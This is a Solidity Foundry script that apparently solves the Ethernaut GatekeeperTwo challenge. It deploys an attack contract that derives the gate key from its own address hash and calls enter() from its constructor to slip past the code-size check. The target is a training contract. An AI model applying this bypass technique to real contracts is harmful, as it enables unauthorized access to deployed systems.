// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IGateKeeperTwo{
    function enter(bytes8 _gateKey) external returns (bool);  
}

contract GatekeeperTwoAttack{
    constructor(address _target){
        //compute hash of this contract address
        bytes8 key = bytes8(
            uint64(
                bytes8(keccak256(abi.encodePacked(address(this))))
            ) ^ type(uint64).max
        );
        //call enter() during constructor
        IGateKeeperTwo(_target).enter(key);    
    }
}


contract GateKeeperTwoSolution is Script {
  
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GatekeeperTwoAttack(0x7775a040Fa8Da15472dbE5D43EdBE8195313cEC1); 
        vm.stopBroadcast();
    }
}